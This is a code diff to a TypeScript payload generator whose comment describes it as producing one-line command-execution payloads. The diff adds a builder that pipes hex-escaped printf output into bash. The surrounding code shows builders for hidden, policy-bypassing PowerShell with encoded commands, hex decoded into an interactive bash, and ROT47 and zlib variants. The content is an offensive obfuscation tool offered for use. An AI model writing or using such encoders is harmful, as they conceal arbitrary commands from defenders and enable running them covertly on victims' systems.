@@ -5,7 +5,7 @@ import { stringToHex } from './hex'
 import { rot47encode } from './rot47'
 // 一行命令执行payload
 
-type AllowedTypes = 'powershell_b64' | 'bash_b64' | 'bash_hex' | 'bash_rot' | 'python_zlib';
+type AllowedTypes = 'powershell_b64' | 'bash_b64' | 'bash_hex' | 'bash_x_hex' | 'bash_rot' | 'python_zlib';
 
 export function powershell_b64_oneliner(input: string): string {
     return `powershell -exec bypass -WindowStyle Hidden -NoLogo -Noexit -enc ${powerB64Encode(input)}`;
@@ -17,6 +17,10 @@ export function bash_b64_oneliner(input: string): string {
 
 export function bash_hex_oneliner(input: string): string {
     return `echo "${stringToHex(input)}" | xxd -r -p | bash -i`;
+}
+
+export function bash_x_hex_oneliner(input: string): string {
+    return `printf '${stringToHex(input, "\\x")}'|bash`;
 }
 
 export function bash_rot47_oneliner(input: string): string {
@@ -39,6 +43,8 @@ export function oneliner(input: string, type: AllowedTypes): string {
             return bash_b64_oneliner(input);
         case 'bash_hex':
             return bash_hex_oneliner(input);
+        case 'bash_x_hex':
+            return bash_x_hex_oneliner(input);
         case 'bash_rot':
             return bash_rot47_oneliner(input);
         case 'python_zlib':
